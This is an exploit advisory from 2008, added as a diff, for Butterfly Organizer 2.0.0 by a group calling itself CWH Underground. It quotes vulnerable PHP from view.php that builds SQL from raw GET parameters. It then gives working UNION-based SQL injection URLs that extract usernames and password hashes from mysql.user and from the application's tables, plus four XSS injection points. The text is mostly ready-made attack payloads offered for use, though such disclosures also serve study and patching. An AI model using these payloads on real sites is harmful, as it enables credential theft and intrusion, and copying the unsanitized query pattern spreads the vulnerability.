@@ -1,0 +1,72 @@
+======================================================================
+ Butterfly Organizer 2.0.0 (SQL/XSS) Multiple Remote Vulnerabilities
+======================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE : 13 June 2008
+SITE : www.citec.us
+
+
+#####################################################
+APPLICATION : Butterfly Organizer
+VERSION     : 2.0.0
+DOWNLOAD    : www.butterflymedia.ro/downloads/organizer_2_0_0.zip
+#####################################################
+
++++ Remote SQL Injection Exploit +++
+
+----------------------------
+ Vulnerable Code [view.php]
+----------------------------
+@Line
+
+   26: $mytable = $_GET['mytable'];
+   27: $id = $_GET['id'];
+   28:
+   29: $result = mysql_query("SELECT * FROM ".$mytable." WHERE id=$id",$database);
+   30: $myrow = mysql_fetch_array($result);
+
+
+----------
+ Exploit
+----------
+[+] http://[Target]/[Organizer_Path]/view.php?id=<SQL INJECTION>&mytable=test_category
+
+
+-------------
+ POC Exploit
+-------------
+[+] http://192.168.24.25/organizer/view.php?id=-99999/**/UNION/**/SELECT/**/concat(user,0x3a,password),2,3,4,5,6,7,8,9,10/**/FROM/**/mysql.user&mytable=test_category
+[+] http://192.168.24.25/organizer/view.php?id=-99999/**/UNION/**/SELECT/**/concat(username,0x3a,password),2,3,4,5,6,7,8,9,10/**/FROM/**/test_category&mytable=test_category
+
+
+
++++ Remote XSS Exploit +++
+
+
+-----------
+ Exploits
+-----------
+[+] http://[Target]/[Organizer_Path]/view.php?id=1&mytable=<XSS>
+[+] http://[Target]/[Organizer_Path]/viewdb2.php?id=1&mytable=<XSS>
+[+] http://[Target]/[Organizer_Path]/category-rename.php?tablehere=<XSS>
+[+] http://[Target]/[Organizer_Path]/module-contacts.php?letter=<XSS>
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-13]
